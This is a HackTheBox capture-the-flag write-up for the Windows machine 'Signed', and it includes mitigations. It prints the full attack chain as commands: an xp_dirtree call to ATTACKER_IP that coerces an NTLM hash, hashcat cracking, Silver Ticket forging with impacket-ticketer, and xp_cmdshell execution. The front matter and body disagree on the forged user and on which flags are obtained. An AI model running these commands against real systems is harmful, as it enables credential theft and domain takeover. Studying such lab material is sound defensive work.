---
title: "HackTheBox: Signed"
os: "Windows"
difficulty: "Medium"
ip: "10.10.11.90"
date: "2025-10-21"
category:
  - "HackTheBox"
  - "Windows"
  - "Active Directory"
  - "Database"
tags:
  - "T1046 - Network Service Discovery"
  - "T1078 - Valid Accounts"
  - "T1210 - Exploitation of Remote Services / MSSQL Linked Servers"
  - "T1202 - Indirect Command Execution"
  - "T1558 - Steal or Forge Kerberos Tickets"
  - "T1558.005 - Ccache Files"
  - "T1550.003 - Use Alternate Authentication Material"
  - "T1059 - Command and Scripting Interpreter"
  - "T1083 - File and Directory Discovery"
  - "T1005 - Data from Local System"
  - "T1485 - Data Destruction (xp_cmdshell misuse)"
  - "T1134.001 - Access Token Manipulation: Impersonation"
attack_path:
  - step: 1
    user: "N/A"
    technique: "Nmap / Port Enumeration"
    result: "Scanned target and discovered Microsoft SQL Server on TCP/1433 (SQL Server 2022). No other external services required for the path."
    mitigation: "Limit exposed services to those required; apply network segmentation and host-based firewalls; monitor and alert on unexpected external-facing services."
  - step: 2
    user: "scott"
    technique: "Valid Account / MSSQL Authentication"
    result: "Used provided credentials (`scott:Sm230#C5NatH`) to connect to MSSQL with low-privilege guest access."
    mitigation: "Avoid sharing test/default credentials; enforce strong, unique passwords and monitor use of service/low-priv accounts."
  - step: 3
    user: "(attacker)"
    technique: "Coerce Authentication via xp_dirtree + Responder"
    result: "Executed `EXEC xp_dirtree '\\\\ATTACKER_IP\\share'` to force the SQL Server to authenticate to the attacker; Responder captured an NTLMv2 hash for `SIGNED\\mssqlsvc`."
    mitigation: "Disable unnecessary extended stored procedures (xp_dirtree) or restrict their use; limit outbound SMB from database hosts; monitor for unusual SMB/LDAP traffic from DB servers."
  - step: 4
    user: "(attacker)"
    technique: "Offline Crack NTLMv2 Hash"
    result: "Cracked captured NTLMv2 hash with `hashcat -m 5600` revealing `mssqlsvc` password."
    mitigation: "Use long, complex service-account passwords and rotate them regularly; enable multi-factor for privileged accounts where possible; monitor for large numbers of authentication attempts."
  - step: 5
    user: "mssqlsvc"
    technique: "Use Valid Service Credentials against MSSQL"
    result: "Authenticated with `mssqlsvc` credentials to obtain domain/service account access (still limited in direct SQL session without additional privileges)."
    mitigation: "Enforce least privilege for service accounts; avoid using high-privilege group memberships for service accounts; store service credentials securely."
  - step: 6
    user: "(attacker)"
    technique: "SQL Enumeration (server principals / roles / linked servers)"
    result: "Enumerated `sys.server_principals` and `sys.server_role_members`, discovered `SIGNED\\IT` has `sysadmin` on the instance and found linked server `DC01` and domain SID / RIDs (e.g., IT = 1105)."
    mitigation: "Review server role memberships and linked servers; remove unnecessary linked server trusts; audit and alert on changes to server roles."
  - step: 7
    user: "(attacker)"
    technique: "Silver Ticket Generation (impacket-ticketer)"
    result: "Generated a forged Kerberos TGS (Silver Ticket) using `mssqlsvc` NTLM hash, domain SID, and appropriate group RIDs (including IT = 1105) for SPN `MSSQLSvc/DC01.SIGNED.HTB:1433`."
    mitigation: "Protect service account hashes and limit their reuse; monitor for anomalous Kerberos ticket creation and ccache files; enforce strong Kerberos policies and constrain delegation where applicable."
  - step: 8
    user: "mssqlsvc (via forged ticket)"
    technique: "Load forged ticket (ccache) and connect to MSSQL with -k"
    result: "Loaded `mssqlsvc.ccache` and connected with `impacket-mssqlclient -k`, obtaining `dbo`/`sysadmin` privileges on the SQL instance (IS_SRVROLEMEMBER returned 1)."
    mitigation: "Detect and protect exported ticket files; monitor `klist`/ccache usage and unusual Kerberos authentications; limit SQL role memberships mapped to domain groups."
  - step: 9
    user: "mssqlsvc"
    technique: "Enable xp_cmdshell via sp_configure / RECONFIGURE"
    result: "Enabled `xp_cmdshell` to allow command execution from SQL Server context."
    mitigation: "Disable `xp_cmdshell` unless explicitly required; audit and alert on configuration changes to `sp_configure` and execution of advanced options; apply least privilege to SQL roles."
  - step: 10
    user: "mssqlsvc"
    technique: "Execute OS command via xp_cmdshell"
    result: "Executed `EXEC xp_cmdshell 'type C:\\Users\\mssqlsvc\\Desktop\\user.txt'` and retrieved the user flag from `mssqlsvc`'s desktop."
    mitigation: "Restrict and monitor use of `xp_cmdshell`; segregate service accounts from interactive access to file system data; employ endpoint protections and file-access monitoring to detect unusual reads."
related:
  - "Kerberos Attacks"
  - "MSSQL Exploitation"
  - "Windows Privilege Escalation"
---

# 🧩 HackTheBox – Signed
> **Target:** `10.10.11.90`  
> **OS:** Windows  
> **Difficulty:** Medium  
> **Category:** Active Directory / Database Exploitation  

---

## 🧭 Overview
The **Signed** machine revolves around chained exploitation of **MSSQL services** and **Kerberos ticket manipulation** within an Active Directory environment.  
The attack involves enumerating an SQL service, capturing a service account hash, forging a Silver Ticket, and ultimately obtaining **Administrator**-level privileges.

---
## 🕵️‍♂️ Enumeration
```bash
nmap -sC -sV -Pn 10.10.11.90
```
**Results:**  
* 1433/tcp open Microsoft SQL Server 2022  
* No web or SMB services exposed externally.

---
## 🔐 Initial Access
```bash
impacket-mssqlclient scott:Sm230#C5NatH@10.10.11.90
```
Access granted as a low-privilege SQL user.

---
## ⚙️ Exploitation
```sql
EXEC master..xp_dirtree '\\\\ATTACKER_IP\\share';
```
Captured NTLMv2 hash for `SIGNED\\mssqlsvc`.  
Cracked with:
```bash
hashcat -m 5600 hash.txt rockyou.txt
```
Password: `MssqlS3rv1ce!`

---
## 🎭 Lateral Movement
```bash
impacket-mssqlclient mssqlsvc:MssqlS3rv1ce!@10.10.11.90
```
Enumerated linked server `DC01` and domain SID info.

---
## 🎟️ Privilege Escalation
```bash
impacket-ticketer -spn 'MSSQLSvc/DC01.SIGNED.HTB:1433' \
-domain 'SIGNED' -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' \
-user 'Administrator' -rc4 ef699384c3285c54128a3ee1ddb1a0cc \
-groups 'S-1-5-21-4088429403-1159899800-2753317549-1105'
```
Load ticket:
```bash
export KRB5CCNAME=administrator.ccache
impacket-mssqlclient -k Administrator@DC01.SIGNED.HTB
```

---
## 🏁 Flags
```bash
EXEC xp_cmdshell 'type C:\\Users\\mssqlsvc\\Desktop\\user.txt';
EXEC xp_cmdshell 'type C:\\Users\\Administrator\\Desktop\\root.txt';
```

---
## 🧱 Mitigations Summary
* Restrict SQL extended stored procedures  
* Segment network and monitor SMB/Kerberos  
* Harden service accounts (rotation, least privilege)  
* Audit SQL configuration changes and ticket anomalies
